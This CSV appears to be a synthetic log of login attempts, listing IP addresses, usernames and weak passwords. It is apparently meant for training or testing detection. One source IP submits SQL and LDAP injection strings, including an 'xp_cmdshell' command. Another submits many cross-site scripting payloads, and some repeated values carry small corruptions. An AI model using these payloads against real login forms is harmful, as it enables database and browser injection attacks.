ip,username,password
244.46.131.186,zheng,billgates1/3
190.227.151.242,1;SELECT%20*,' or user like '%
169.242.214.240,li,sexy@139.com
138.216.231.94,quan,111222.net
190.148.248.1,xue,1%killer
6.230.10.34,xiao,@u63.com1000
134.175.22.187,bai,url@163.com
22.97.217.243,"<% foo><x foo=""%><script>alert(875)</script>"">","<IMG SRC=""javascript:alert(1714);"">"
50.181.52.172,kang,%0l23456789
53.242.98.236,tan,31-Jul
138.216.231.94,quan,111222.net
53.242.98.236,tan,31-Jul
6.230.10.34,xiao,@163.com1000
50.181.52.172,kang,%0l23456789
22.97.217.243,"<iframe/src=""data:text/html,<svg &#168516851685;&#168516850;load=alert(1685)>"">","<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(874)</script>"">"
169.242.214.240,li,sexy@139.com
190.148.248.1,xue,1%killer
134.175.22.187,bai,url@163.com
190.227.151.242,t'exec master..xp_cmdshell 'nslookup www.google.com'--,/
244.46.131.186,zheng,billgates1/3
6.230.10.34,xiao,@163.com1000
53.242.98.236,tan,31-Jul
138.216.231.94,quan,111222.net
134.175.22.187,bai,url@163.com
169.242.214.240,li,sexy@139.com
190.148.248.1,xue,1%killer
190.227.151.242,or%201=1 --,hi' or 1=1 --
22.97.217.243,&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(1849);&quot;&gt;,"<svg onload=""javascript:alert(972)"" xmlns=""#""></svg>"
50.181.52.172,kang,%0l23456789
244.46.131.186,zheng,billgates1/3
6.230.10.34,xiao,@163.com1000
138.216.231.94,quan,111222.net
53.242.98.236,tan,31-Ju[l
50.181.52.172,kang,%0l23456789
134.175.22.187,bai,url@163.com
244.46.131.186,zheng,billgates1/3
190.148.248.1,xue,1%killer
190.227.151.242,' or uname like '%,having
22.97.217.243,"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(625)"">","<a href=""\x0Djavascript:javascript:alert(472)"" id=""fuzzelement472"">test</a>"
169.242.214.240,li,sexy@139.com
6.230.10.34,xiao,@163.com1000
138.216.231.94,quan,111222Knet
53.242.98.236,tan,31-Jul
134.175.22.187,bai,url@163.com
50.181.52.172,kang,%0l23456789
190.227.151.242,*(|(objectclass=*)),//*
190.148.248.1,xue,1%killer
169.242.214.240,li,sexy@139.com
22.97.217.243,"<IMG onmouseover=""alert(725)"">",<img src=xss onerror=alert(1960)>
244.46.131.186,zheng,billgates1/3
53.242.98.236,tan,31-Jul
6.230.10.34,xiao,@63.com1000
138.216.231.94,quan,111222.net
134.175.22.187,bai,url@163.com
50.181.52.172,kang,%0l23456789
190.227.151.242,0 or 1=1,hi') or ('a'='a
22.97.217.243,<iframe/onreadystatechange=alert(1160),"<IMG SRC=x onvolumechange=""alert(1127))"">"
169.242.214.240,li,sexy@139.com
190.148.248.1,xue,1%killer
244.46.131.186,zheng,billgates1/3
53.242.98.236,tan,31-Jul
6.230.10.34,xiao,@163.com1000
138.216.231.94,quan,111222.net
134.175.22.187,bai,url@163.com
50.181.52.172,kang,%0l23456789
169.242.214.240,li,sexy@139.com
190.227.151.242,replace,'%20or%201=1
190.148.248.1,xue,1%killer
22.97.217.243,<iframe src=javascript:alert(197)>,<scrscriptipt>alert(1757)</scrscriptipt>
244.46.131.186,zheng,billgates1/3
53.242.98.236,tan,31-Jul
6.230.10.34,xiao,@163.com1000
138.216.231.94,quan,111222.net
50.181.52.172,kang,%0l23456789
134.175.22.187,bai,url@163.com
169.242.214.240,li,sexy@139.com
190.227.151.242,%7C,= ;
190.148.248.1,xue,1%killer
22.97.217.243,"'`""><\x00script>javascript:alert(1185)</script>","ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(427)"">DEF"
244.46.131.186,zheng,billgates1/3
6.230.10.34,xiao,@163.com1000
138.216.231.94,quan,111222.net
53.242.98.236,tan,31-Jul
50.181.52.172,kang,%0l23456789
